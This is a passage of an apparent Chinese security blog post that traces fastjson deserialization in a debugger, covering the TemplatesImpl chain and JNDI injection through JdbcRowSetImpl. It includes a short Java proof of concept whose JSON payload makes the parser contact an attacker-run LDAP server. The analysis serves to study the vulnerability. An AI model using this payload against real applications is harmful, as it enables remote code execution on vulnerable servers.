+<p>继续跟进JSONObject的构造方法</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson20.png" alt="img"></p>
+<p>继续调用一个重载方法</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson21.png" alt="img"></p>
+<p>将map实例化为一个HashMap对象，返回，继续调用parseObject方法，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson22.png" alt="img"></p>
+<p>然后会走到这一步</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson23.png" alt="img"></p>
+<p>if条件均成立，步入，lexer.scanSymbol方法就是获取@type后面的类名，紧接着便调用LoadClass加载该类，然后会走到这里</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson24.png" alt="img"></p>
+<p>clazz便是Templates类，调用JavaBeanDeserializer的deserialze方法，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson25.png" alt="img"></p>
+<p>继续调用重载方法</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson26.png" alt="img"></p>
+<p>然后运行到这里我们可以发现fieldInfo已经被赋值为了outputProperties</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson28.png" alt="img"></p>
+<p>我们去看看它是如何被赋值的，定位到上一步的getDeserializer方法</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson27.png" alt="img"></p>
+<p>跟进getDeserializer方法</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson29.png" alt="img"></p>
+<p>继续调用重载方法<code>getDeserializer((Class&lt;?&gt;) type, type)</code>，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson30.png" alt="img"></p>
+<p>然后到这里，调用createJavaBeanDeserializer方法</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson31.png" alt="img"></p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson33.png" alt="img"></p>
+<p>走到这里</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson32.png" alt="img"></p>
+<p>调用JavaBeanInfo.build方法，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson34.png" alt="img"></p>
+<p><code>Field[] declaredFields = clazz.getDeclaredFields();</code>获取Templates所有的属性，<code>Method[] methods = clazz.getMethods();</code>获取所有的方法</p>
+<p>然后到这里，获取getter方法的属性值</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson35.png" alt="img"></p>
+<p>并将其加入fieldlist，获取到了outputProperties属性</p>
+<p>回到JavaBeanDeserializer的deserialze方法，到这里</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson37.png" alt="img"></p>
+<p>调用parseField方法，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson36.png" alt="img"></p>
+<p>继续调用smartMatch方法，到这里</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson38.png" alt="img"></p>
+<p>去掉_，回去，到这一步</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson39.png" alt="img"></p>
+<p>调用fieldDeserializer.parseField方法，其实是DefaultFieldDeserializer的parseFiled方法，跟进，然后到这里</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson40.png" alt="img"></p>
+<p>然后调用setvalue方法，跟进，到这里</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson42.png" alt="img"></p>
+<p>调用了TemplatesImpl.getOutputProperties()方法</p>
+<p>终于完了……</p>
+<h2 id="JNDI漏洞复现"><a href="#JNDI漏洞复现" class="headerlink" title="JNDI漏洞复现"></a>JNDI漏洞复现</h2><p>exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package main.java.fastjson;</span><br><span class="line"></span><br><span class="line">import com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line">public class POC_JNDI &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String PoC = &quot;&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:7777/test\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;;</span><br><span class="line">        JSON.parse(PoC);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>启动一个ldap服务，并在test.class下监听端口</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson43.png" alt="img"></p>
+<h2 id="调试分析JNDI漏洞"><a href="#调试分析JNDI漏洞" class="headerlink" title="调试分析JNDI漏洞"></a>调试分析JNDI漏洞</h2><p>jndi注入通用性较强（因为它不需要特殊选项），但是需要在目标出网的情况下才能使用</p>
+<p>前面的过程基本和反序列化差不多，因为前面部分的本质就是调试查看fastjson是如何调用@type类的getter和setter方法。</p>
+<p>那我们就再看看JNDI调用了JdbcRowSetImpl的哪个setter&#x2F;getter方法，而后又是什么情况</p>
+<p>我们可以在FieldDeserialize的setValue处下个断点</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson44.png" alt="img"></p>
+<p>这之后会运行到这里</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson45.png" alt="img"></p>
+<p>利用invoke调用了JdbcRowSetImpl的setAutoCommit方法，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson46.png" alt="img"></p>
+<p>调用了connect方法，跟进</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson47.png" alt="img"></p>
+<p>有个明显的lookup函数，其中的参数调用了getDataSourceName()方法，跟进一下</p>
+<p><img src="https://ilikeoyt.github.io/image/fastjson48.png" alt="img"></p>
+<p>可以看到，这里返回的就是我们自定义的dataSourceName属性，说明是可控的，当然也就造成了JNDI漏洞</p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/08/02/PostgreSQL-JDBC-%EF%BC%88CVE-2022-21724%EF%BC%89/"> PostgreSQL JDBC （CVE-2022-21724）</a></p>
+<p><a target="_blank" rel="noopener" href="https://ilikeoyt.github.io/2023/08/05/C3P0-GADGET/">C3P0_GADGET </a></p>
+<p>© 2024 ycxlo</p>
+<p>Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> &amp; <a target="_blank" rel="noopener" href="https://muse.theme-next.org/">NexT.Muse</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2023/08/05/C3P0-GADGET/" rel="prev" title="C3P0_GADGET">
+      <i class="fa fa-chevron-left"></i> C3P0_GADGET
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2023/08/07/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" rel="next" title="Tomcat内存马">
+      Tomcat内存马 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFfastjson%EF%BC%9F"><span class="nav-number">1.</span> <span class="nav-text">什么是fastjson？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fastjson%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8"><span class="nav-number">2.</span> <span class="nav-text">fastjson的简单使用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">3.</span> <span class="nav-text">反序列化漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90Templates%E9%93%BE"><span class="nav-number">4.</span> <span class="nav-text">调试分析Templates链</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#JNDI%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">JNDI漏洞复现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90JNDI%E6%BC%8F%E6%B4%9E"><span class="nav-number">6.</span> <span class="nav-text">调试分析JNDI漏洞</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">John Doe</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
